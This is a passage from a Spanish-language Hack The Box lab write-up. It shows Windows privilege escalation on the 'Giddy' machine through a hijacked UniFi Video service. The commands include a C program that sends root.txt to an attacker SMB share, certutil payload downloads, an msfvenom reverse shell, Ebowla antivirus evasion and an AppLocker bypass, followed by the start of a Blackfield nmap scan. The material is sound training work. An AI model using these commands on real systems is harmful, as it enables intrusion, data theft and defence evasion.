	system<span class="o">(</span><span class="s2">"type C:</span><span class="se">\\</span><span class="s2">Users</span><span class="se">\\</span><span class="s2">Administrator</span><span class="se">\\</span><span class="s2">Desktop</span><span class="se">\\</span><span class="s2">root.txt &gt; </span><span class="se">\\\\</span><span class="s2">10.10.14.216</span><span class="se">\\</span><span class="s2">smbFolder</span><span class="se">\\</span><span class="s2">root.txt"</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Ahora usamos la herramienta que instalamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content x86_64-w64-mingw32-gcc exc.c <span class="nt">-o</span> taskkill.exe
</code></pre></div></div>

<ul>
  <li>Vamos a mandarlo a la maquina victima otra vez.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.216:8080/taskkill.exe taskkill.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  000000  ...
  01c0d2
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        4/26/2024   2:48 PM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
<span class="nt">-a----</span>        7/26/2017   6:10 PM         219136 avService.exe
<span class="nt">-a----</span>        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
<span class="nt">-a----</span>        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
<span class="nt">-a----</span>        4/26/2024   4:40 PM         114898 taskkill.exe
<span class="nt">-a----</span>        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
<span class="nt">-a----</span>        7/26/2017   6:10 PM          48640 UniFiVideo.exe
<span class="nt">-a----</span>        7/26/2017   6:10 PM          32038 UniFiVideo.ico
<span class="nt">-a----</span>        6/16/2018   9:54 PM          89050 Uninstall.exe
</code></pre></div></div>

<ul>
  <li>Ahora iniciamos el <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> por que en el script definimos que allí nos llegue la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Ahora tenemos que conocer el nombre del servicio para poder pararlo y arrancarlo <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree">https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">cd </span>HKLM:SYSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices
</code></pre></div></div>

<ul>
  <li>Vemos el nombre.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt; <span class="nb">dir</span> | Select-String <span class="s1">'Unifi'</span>

HKEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices<span class="se">\U</span>niFiVideoService


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos parar el proceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt; Stop-Service <span class="nt">-Name</span> UniFiVideoService <span class="nt">-Force</span>
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt;
</code></pre></div></div>

<ul>
  <li>Y nos llega.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.96.140,49729<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>GIDDY<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.96.140,49729<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
</code></pre></div></div>

<h2 id="root-flag">root flag</h2>

<ul>
  <li>Y vemos la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>root.txt
2873baf68c08b318321f3689ca29ad7a
</code></pre></div></div>

<h2 id="shell-as-root">Shell as root</h2>

<ul>
  <li>
    <p>Ahora vamos a ganar acceso pero con una consola.</p>
  </li>
  <li>
    <p>Vamos a volver a generar el <code class="language-plaintext highlighter-rouge">.exe</code> con <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.216 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> taskkill.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: taskkill.exe
</code></pre></div></div>

<ul>
  <li>Vamos arrancar el servicio otra vez.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt; cmd /c sc start UniFiVideoService

SERVICE_NAME: UniFiVideoService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                <span class="o">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span class="o">)</span>
        WIN32_EXIT_CODE    : 0  <span class="o">(</span>0x0<span class="o">)</span>
        SERVICE_EXIT_CODE  : 0  <span class="o">(</span>0x0<span class="o">)</span>
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1148
        FLAGS              :
</code></pre></div></div>

<ul>
  <li>Podemos usar la siguiente herramienta para burla el defender <a href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/Genetic-Malware/Ebowla
Cloning into <span class="s1">'Ebowla'</span>...
remote: Enumerating objects: 559, <span class="k">done</span><span class="nb">.</span>
remote: Total 559 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 559
Receiving objects: 100% <span class="o">(</span>559/559<span class="o">)</span>, 35.46 MiB | 1.29 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>287/287<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">mv </span>taskkill.exe Ebowla
➜  content <span class="nb">cd </span>Ebowla
➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls
</span>Eko_2016_Morrow_Pitts_Master.pdf                  cleanup.py
Infiltrate_2016_Morrow_Pitts_Genetic_Malware.pdf  documentation.md
LICENSE.md                                        ebowla.py
MemoryModule                                      encryption
README.md                                         formats.md
build_python.sh                                   genetic.config
build_x64_go.sh                                   taskkill.exe
build_x86_go.sh                                   templates
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora vamos a editar el <code class="language-plaintext highlighter-rouge">genetic.config</code>.</p>
  </li>
  <li>
    <p>Tiene que quedar de esta forma.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">cat </span>genetic.config
<span class="o">[</span>Overall]

    <span class="c"># Options ENV, OTP</span>

    Encryption_Type <span class="o">=</span> ENV


    <span class="c"># Template output: GO, Python, OR PowerShell</span>

    output_type <span class="o">=</span> GO


    <span class="c"># Number of bytes subtracted from the reconstructed payload that will be the</span>
    <span class="c"># sha512 checksum used when checking the file before executing the payload.</span>

    minus_bytes <span class="o">=</span> 1


    <span class="c"># type of file being fed (payload) - also determines execution</span>
    <span class="c"># Python: EXE, DLL_x86, DLL_x64 are written to disk</span>
    <span class="c"># GO: Nothing is written to disk</span>
    <span class="c"># OPTIONS for GO: EXE, DLL_x86, DLL_x64, SHELLCODE</span>
    <span class="c"># OPTIONS for PYTHON: EXE, SHELLCODE, CODE, FILE_DROP</span>
    <span class="c"># OPTIONS for PowerShell: CODE, DLL_x86, DLL_x64, EXE, FILE_DROP</span>

    payload_type <span class="o">=</span> EXE


    <span class="c"># key_iterations is for otp_type = key and for symmetric_settings_win</span>
    <span class="c"># It is the number of times that the key hash is iterated via sha512 before being used</span>
    <span class="c"># as the encryption key.  NOT available to otp_type = full</span>

    key_iterations <span class="o">=</span> 10000

    <span class="c"># Clean the resulting loaders from comments and print statements</span>
    <span class="c"># This will make the runs faster and not display status information on the victim host</span>
    <span class="c"># Most useful once payloads have been tested and are ready for deployment</span>
    <span class="c"># Values Bool: True or False</span>

    clean_output <span class="o">=</span> False


<span class="o">[</span>otp_settings]
    <span class="c"># otp is simple, provide one time pad, type,  and starting search location</span>
    <span class="c"># type is full otp to reconstruct the malware in memory, or an offset in the file for a symmetric key</span>

    otp_type <span class="o">=</span> key <span class="c"># OPTIONS: full, key</span>


    <span class="c"># File for use with otp</span>

    pad <span class="o">=</span> <span class="s1">'cmd.exe'</span>

    <span class="c"># Max pad size: Decide the largest pad size to use.</span>
    <span class="c"># 256 ** 3 - 1 (16777215 or 0xffffff) maximum is supported</span>
    <span class="c"># Too small might be a bad idea...</span>

    pad_max <span class="o">=</span> 0xffffff

    <span class="c"># starting location in the path to start looking if walking the path</span>

    scan_dir <span class="o">=</span> <span class="s1">'c:\windows\sysnative'</span><span class="c">#'%APPDATA%'</span>


    <span class="c"># For use with FULL OTP:</span>
    <span class="c">#  Number of max bytes for matching the payload against the OTP</span>
    <span class="c">#  -- larger byte width equals possible smaller lookup table but longer build times</span>

    byte_width <span class="o">=</span> 9



<span class="o">[</span>symmetric_settings_win]
    <span class="c"># AES-CFB-256 key from a combination of the any of the following settings.</span>
    <span class="c"># Any of the following can be used, the more specific to your target the better.</span>


    <span class="c"># set the value to '' if you do not want to use that value</span>


    <span class="c"># This is not a permanent list.  Any env variable can be added below.</span>
    <span class="c"># If you want the env variable to be used, give it a value.</span>
    <span class="c"># These are case insensitive.</span>

    <span class="o">[[</span>ENV_VAR]]

        username <span class="o">=</span> <span class="s1">''</span>
        computername <span class="o">=</span> <span class="s1">'Giddy'</span>
        homepath <span class="o">=</span> <span class="s1">''</span>
        homedrive <span class="o">=</span> <span class="s1">''</span>
        Number_of_processors <span class="o">=</span> <span class="s1">''</span>
        processor_identifier <span class="o">=</span> <span class="s1">''</span>
        processor_revision <span class="o">=</span> <span class="s1">''</span>
        userdomain <span class="o">=</span> <span class="s1">''</span>
        systemdrive <span class="o">=</span> <span class="s1">''</span>
        userprofile <span class="o">=</span> <span class="s1">''</span>
        path <span class="o">=</span> <span class="s1">''</span>
        temp <span class="o">=</span> <span class="s1">''</span>


     <span class="o">[[</span>PATH]]

    <span class="c"># Check if a path exists on the workstation</span>
    <span class="c"># Only one path can be used.  This is immutable. To use, give it a value and a start location.</span>

        <span class="c"># This is the path that will be used as part of the key</span>

        path <span class="o">=</span> <span class="s1">''</span>

        <span class="c"># You can provide Env Variables that are associated with a path for the start_loc</span>
        <span class="c">#  , such as %TEMP%, %APPDATA%, %PROGRAMFILES%</span>
    <span class="c"># You Must use the %ENV VAR% when using env vars for paths!</span>
    <span class="c"># Examples: C:\Windows, C:\Program Files, %APPDATA%</span>

    start_loc <span class="o">=</span> <span class="s1">'%HOMEPATH%'</span>


    <span class="o">[[</span>IP_RANGES]]

    <span class="c"># Network mask for external enumeration 22.23.0.0</span>
    <span class="c"># IP mask should not be used alone more simple to brute force.</span>
    <span class="c"># Support for only 24 16 8 masks or exact ip</span>
    <span class="c"># 12.12.0.0 or 12.12.12.12 or 12.12.0.0 or 12.0.0.0</span>

    external_ip_mask <span class="o">=</span> <span class="s1">''</span>


    <span class="o">[[</span>SYSTEM_TIME]]

    <span class="c"># Time Range with BEGING and END in EPOC</span>
        <span class="c"># Should be used with another variable</span>
    <span class="c"># This is a mask: 20161001 or 20161000 or 20160000</span>
    <span class="c"># YEAR, MONTH, DAY</span>

    Time_Range <span class="o">=</span> <span class="s1">''</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ python2 ebowla.py taskkill.exe genetic.config
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using Symmetric encryption
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload length 7168
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload_type exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using EXE payload template
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Used environment variables:
	<span class="o">[</span>-] environment value used: computername, value used: giddy
<span class="o">[!]</span> Path string not used as pasrt of key
<span class="o">[!]</span> External IP mask NOT used as part of key
<span class="o">[!]</span> System <span class="nb">time </span>mask NOT used as part of key
<span class="o">[</span><span class="k">*</span><span class="o">]</span> String used to <span class="nb">source </span>the encryption key: giddy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Applying 10000 sha512 <span class="nb">hash </span>iterations before encryption
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption key: 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing GO payload to: go_symmetric_taskkill.exe.go
</code></pre></div></div>

<ul>
  <li>Y aquí no los guardo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls</span> <span class="nt">-l</span> output
total 20
<span class="nt">-rw-r--r--</span> 1 miguel miguel 20223 Apr 26 15:34 go_symmetric_taskkill.exe.go
</code></pre></div></div>

<ul>
  <li>Ahora tenemos que compilarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ ./build_x64_go.sh output/go_symmetric_taskkill.exe.go taskkill_ebowla.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Copy Files to tmp <span class="k">for </span>building
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building <span class="nb">complete</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Copy taskkill_ebowla.exe to output
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Done
</code></pre></div></div>

<ul>
  <li>Allí tenemos el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  output git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls
</span>go_symmetric_taskkill.exe.go  taskkill_ebowla.exe
</code></pre></div></div>

<ul>
  <li>Después de cambiarle el nombre vamos a subirlo de nuevo ala maquina victima usando el servidor <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python3</code> que teníamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; erase taskkill.exe
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.216:80/taskkill.exe taskkill.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  000000  ...
  3dea72
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Pero ahora nos da otro error.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; .<span class="se">\t</span>askkill.exe
Program <span class="s1">'taskkill.exe'</span> failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~.
At line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
</code></pre></div></div>

<ul>
  <li>Aquí nos dicen rutas para que no nos pase eso <a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; copy taskkill.exe C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor<span class="se">\t</span>askkill.exe
</code></pre></div></div>

<ul>
  <li>Si lo ejecutamos nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\s</span>pool<span class="se">\d</span>rivers<span class="se">\c</span>olor&gt; .<span class="se">\t</span>askkill.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> IV: 1150b91085ef56a08ef912c3eb577bf7
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Size of encrypted_payload:  9600
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Hash of encrypted_payload: 0b07402cefb4af5c5479a73d1ce4c9263622edf5ec70b53c750207e111d46d967727a660aeb7de5b29c8327585d76eb7c03182940081d2fff0d0d664319600a7
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Number of keys: 1
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Final key_list: <span class="o">[</span>giddy]
<span class="o">==================================================</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key: giddy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Computed Full Key @ 2710 iterations: 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c8a0e4c69b5ea1fba75d8bce580a3a7a51df239e28be0c36675dd065b1d4dd921
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AES Password 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Decoded Payload with Padding: 2e95bce3869bea6029ee864c4d9765424a36413a268f452c532259ee2faecc6708d839228cc51165614c0e8f8a1c0396b5695db2c1eba525c3d121cf9b4de819
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Message Length: 7168
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Message Length w/ Padding: 7168
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Test Hash : 1392fb2eafe3dfd6a8e0ff9159df555b5ec2f19ff617c78811ecf66834abdd9062b8dfc7d3696311ecaf53834c9bad4efbb02107a2fb0fd9378547686374fe32
Search Hash: 1392fb2eafe3dfd6a8e0ff9159df555b5ec2f19ff617c78811ecf66834abdd9062b8dfc7d3696311ecaf53834c9bad4efbb02107a2fb0fd9378547686374fe32
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Hashes Match
Len full_payload: 7168
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key Combinations:  <span class="o">[[</span>giddy]]
</code></pre></div></div>

<ul>
  <li>Con esto podemos ver que si funciona pero queremos estar como el administrador si recordamos necesitamos parar el servicio y arrancarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; Stop-Service <span class="nt">-Name</span> UniFiVideoService <span class="nt">-Force</span>
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
</code></pre></div></div>

<ul>
  <li>Y ahora ya estamos como <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.216] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.96.140] 49774
Microsoft Windows <span class="o">[</span>Version 10.0.14393]
<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.

C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Blackfield (hard)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/04/20/blackfield.html" rel="alternate" type="text/html" title="HackTheBox - Blackfield (hard)" /><published>2024-04-20T00:00:00-06:00</published><updated>2024-04-20T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/04/20/blackfield</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/04/20/blackfield.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/7c69c876f496cd729a077277757d219d.png" />
</p>

<ul>
  <li>En este post vamos a estar haciendo la maquina Blackfield de la plataforma de Hack The Box donde vamos a estar enumerando por SMB, estar usando kerbrute para validar usuarios del dominio y poder hacer un ASRepRoast Attack además de que enumerando con Bloodhound encontramos que podemos cambiarle la contraseña a un usuario usando net rpc y nos conectaremos con evil-winrm ala maquina para la escalada de privilegios abusaremos de un privilegio que tenemos que es el SeBackupPrivilege para hacer una copia de 2 archivos y usar secretsdump para ver los hashes de los usuarios y conectarnos como el administrador.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los servicios que corre la maquina victima en sus puertos abiertos por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,389,445,593,3268,5985 10.129.126.69 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-19 19:05 CST
Nmap scan report <span class="k">for </span>10.129.126.69
Host is up <span class="o">(</span>0.089s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-20 08:05:47Z<span class="o">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
